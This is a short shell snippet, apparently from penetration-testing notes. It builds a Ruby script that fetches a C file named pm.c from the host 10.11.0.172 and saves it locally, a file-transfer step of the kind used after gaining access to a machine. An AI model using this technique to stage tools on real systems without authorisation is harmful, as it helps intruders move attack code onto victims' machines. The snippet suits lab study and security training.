echo '#!/usr/bin/ruby' >ruby_dl.rb
echo "require 'net/http'" >> ruby_dl.rb
echo 'Net::HTTP.start("10.11.0.172") { |http|' >> ruby_dl.rb
echo   'resp = http.get("/pm.c")' >> ruby_dl.rb
echo   'open("download_via_ruby", "wb") { |file|' >> ruby_dl.rb
echo     'file.write(resp.body)' >> ruby_dl.rb
echo   '}' >> ruby_dl.rb
echo '}'  >> ruby_dl.rb
